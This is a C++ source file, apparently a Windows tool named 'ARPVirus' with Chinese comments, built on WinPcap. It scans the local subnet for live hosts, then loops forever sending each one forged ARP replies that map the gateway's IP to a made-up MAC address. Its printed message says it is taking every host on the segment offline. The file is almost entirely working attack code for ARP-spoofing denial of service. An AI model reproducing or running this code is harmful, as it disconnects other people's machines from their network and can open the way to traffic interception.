// ARPVirus.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "global.h"
#include "IPHeaders.h"

int init_info();
void enum_host();
DWORD WINAPI scan_lan(LPVOID lparam);
void delete_localip_in_hostList();
void init_arp();
void init_host_arp();
void read_ip();

int lib_main()
{
	int nRet = 0;
	nRet = init_info();
	if(nRet)
		return nRet;

	enum_host();
    delete_localip_in_hostList();
	if(hostList.size() == 0)
		return -1;
    printf("%s\n","正在扫描在线主机......");
	Sleep(2*1000);
    printf("当前在线的主机数量%d\n",hostList.size());
	printf("%s\n","正在使网段内所有主机断线......按ctrl+z键退出");
	//init_arp();
	init_host_arp();

	while(true)
	{
		std::list< PLAN_HOST_INFO >::iterator iter = hostList.begin();
		while(iter != hostList.end())
		{
			arp.DestinationIP = inet_addr((*iter)->IpAddr);
			memcpy(arp.DestinationMAC, (*iter)->ucMacAddr, 6);
			memcpy(&sendBuffer[14], &arp, 28);
			pcap_sendpacket(pfp, sendBuffer, 14+28);
			iter++;
		}
		Sleep(2*1000);
	}
	pcap_close(pfp);
}

int init_info()
{
	//获得网卡列表
	ULONG ulLen = 0;
	::GetAdaptersInfo(pAdapterInfo,&ulLen);
	pAdapterInfo = (PIP_ADAPTER_INFO)::GlobalAlloc(GPTR, ulLen);
	
	if(::GetAdaptersInfo(pAdapterInfo,&ulLen) ==  ERROR_SUCCESS)
    {
        char adaptername[100];
        pOrgAdapterInfo = pAdapterInfo;
        while(pAdapterInfo != NULL)
        {
            strcpy(adaptername,"\\Device\\NPF_");
            strcat(adaptername,pAdapterInfo->AdapterName);
            strcpy(pAdapterInfo->AdapterName,adaptername);
            pAdapterInfo = pAdapterInfo->Next;
        }
    }
	
	//获得活动网卡
	while(pOrgAdapterInfo != NULL)
	{
		pfp = pcap_open_live( pOrgAdapterInfo->AdapterName ,  100, 0, 1, error );
		ULONG macAddLen=6;
		//如果能正常打开网卡，且能正确连入网关，则判断为活动网卡
		if(pfp != NULL && (SendARP(inet_addr((char*)pOrgAdapterInfo->GatewayList.IpAddress.String), (IPAddr) NULL,(PULONG) gatewaymac, &macAddLen) == NO_ERROR))
			break;
		else
			pOrgAdapterInfo = pOrgAdapterInfo->Next;
	}

	//没有满足要求的网卡则说明主机不能正常上网，程序退出。
	if(pOrgAdapterInfo == NULL)
		return -1;
    //从网卡获取基本网络信息，gatewaymac由上面的SendARP已获得。
	localip.append((char*)pOrgAdapterInfo->IpAddressList.IpAddress.String);
	netmask.append((char*)pOrgAdapterInfo->IpAddressList.IpMask.String);
	gatewayip.append((char*)pOrgAdapterInfo->GatewayList.IpAddress.String);
	ULONG macLen=6;
	if(!(SendARP(inet_addr((char*)pOrgAdapterInfo->IpAddressList.IpAddress.String), (IPAddr) NULL,(PULONG) localmac, &macLen) == NO_ERROR))
		return -2;

	return 0;
}

void enum_host()
{
	unsigned int uHostNum;//网段内可划分的主机数量
	unsigned int uHostByte; //主机位

	uHostNum = ~ htonl(inet_addr(netmask.data())) - 1;//由子网掩码得到网段内的主机数量。子网主机个数 = ~ MASK - 1
	uHostByte = htonl(inet_addr(gatewayip.data())) & 0xffffff00;// 由IP地址得到主机位
	
	if (uHostNum > 2000)//防止掩码设为255.0.0.0之类的
		uHostNum = 2000;

	// 两个临时变量,存放IP与MAC
	char TempIpAddr[4 * 4];
	char MACAddr[40];
    
	//线程句柄，最多2000个
	HANDLE hThread[2001]; 

	int i;
	for (i = 0, uHostByte++; i < uHostNum; i++, uHostByte++)
	{
		// 构造IP地址
		memset(TempIpAddr, 0, 16);
		sprintf(TempIpAddr, "%d.%d.%d.%d", 
			(uHostByte & 0xff000000) >> 0x18,//取出IP位后右移24位
			(uHostByte & 0x00ff0000) >> 0x10,//取出IP位后右移16位
			(uHostByte & 0x0000ff00) >> 0x08,//取出IP位后右移8位
			(uHostByte & 0x000000ff));//取出最后一个IP位，初始为0，以后每次加1
		//临时构造的主机信息，包含所要探测的IP
		PLAN_HOST_INFO tempHostInfo = new LAN_HOST_INFO;
		memset(tempHostInfo, 0, sizeof(LAN_HOST_INFO));
		memcpy(tempHostInfo->IpAddr, TempIpAddr, sizeof(TempIpAddr));
		//将tempHostInfo传给scan_lan，并探测其是否在线
		DWORD ThreadId;
		hThread[i] = CreateThread(NULL,0,scan_lan,tempHostInfo,0,&ThreadId);
	}
    //等待所有线程返回，注意，最多只能等待64个。
	WaitForMultipleObjects(MAXIMUM_WAIT_OBJECTS,hThread,TRUE,INFINITE);
}

DWORD WINAPI scan_lan(LPVOID lparam)
{
	int flag;
	//获得传值过来的待扫描主机信息
	PLAN_HOST_INFO HostInfo = (PLAN_HOST_INFO)lparam;
	char IpAddr[16];
	unsigned char ucMacAddr[6];
	memcpy(IpAddr, HostInfo->IpAddr, sizeof(IpAddr));
	ULONG macLen=6;
	memset(ucMacAddr, 0xff, sizeof(ucMacAddr));
	//发送ARP探测是否在线，并保存MAC地址
	if (SendARP(inet_addr(IpAddr), (IPAddr) NULL,(PULONG) ucMacAddr, &macLen) == NO_ERROR)
		flag = 1;
	else
		flag =0;

	//如果该主机在线则加入全局变量hostList。
	if(flag)
	{
		memcpy(HostInfo->ucMacAddr, ucMacAddr, sizeof(ucMacAddr));
		mutex.Lock();
		hostList.push_back(HostInfo);
		mutex.Unlock();
	}
	else
		delete HostInfo;
	return 0;
}

void delete_localip_in_hostList()
{
	std::list< PLAN_HOST_INFO >::iterator iter = hostList.begin();
	while(iter != hostList.end())
	{
		if(!(strcmp((*iter)->IpAddr, localip.data()))
			|| !(strcmp((*iter)->IpAddr, gatewayip.data())))
		{
			iter = hostList.erase(iter);
			continue; 
		}
		iter++;
	}

}

void init_arp()
{
	memset(&ethernet, 0, sizeof(ethernet));
	BYTE hostmac[8];
	
	
	//此MAC为瞎编的
	hostmac[0] = 0x00;
    hostmac[1] = 0x23;
    hostmac[2] = 0x8B;
    hostmac[3] = 0x6A;
    hostmac[4] = 0x44;
    hostmac[5] = 0xB7;
	
	
	memcpy(ethernet.SourMAC, localmac, 6);
    memcpy(ethernet.DestMAC, gatewaymac, 6);
	ethernet.EthType = htons(0x0806);
	memcpy(&sendBuffer, &ethernet, 14);
	
	arp.HardwareType = htons(0x0001);
	arp.ProtocolType = htons(0x0800);
	arp.MACLength = 6;
    arp.IpAddLength = 4;
    arp.OperationCode = htons(0x0002);//ARP REPLY包
	memcpy(arp.SourceMAC, ethernet.SourMAC, 6);
	memcpy(arp.DestinationMAC, ethernet.DestMAC, 6);
	arp.DestinationIP = inet_addr(gatewayip.data());
}

void init_host_arp()
{
	memset(&ethernet, 0, sizeof(ethernet));
	BYTE hostmac[8];
	

	//此MAC为瞎编的
	hostmac[0] = 0x00;
    hostmac[1] = 0x23;
    hostmac[2] = 0x8B;
    hostmac[3] = 0x6A;
    hostmac[4] = 0x44;
    hostmac[5] = 0xB7;
	
	
	memcpy(ethernet.SourMAC, hostmac, 6);
    memcpy(ethernet.DestMAC, gatewaymac, 6);
	ethernet.EthType = htons(0x0806);
	memcpy(&sendBuffer, &ethernet, 14);
	
	arp.HardwareType = htons(0x0001);
	arp.ProtocolType = htons(0x0800);
	arp.MACLength = 6;
    arp.IpAddLength = 4;
    arp.OperationCode = htons(0x0002);//ARP REPLY包
	memcpy(arp.SourceMAC, ethernet.SourMAC, 6);
	memcpy(arp.DestinationMAC, ethernet.DestMAC, 6);
	arp.SourceIP = inet_addr(gatewayip.data());
}

void read_ip()
{
	
}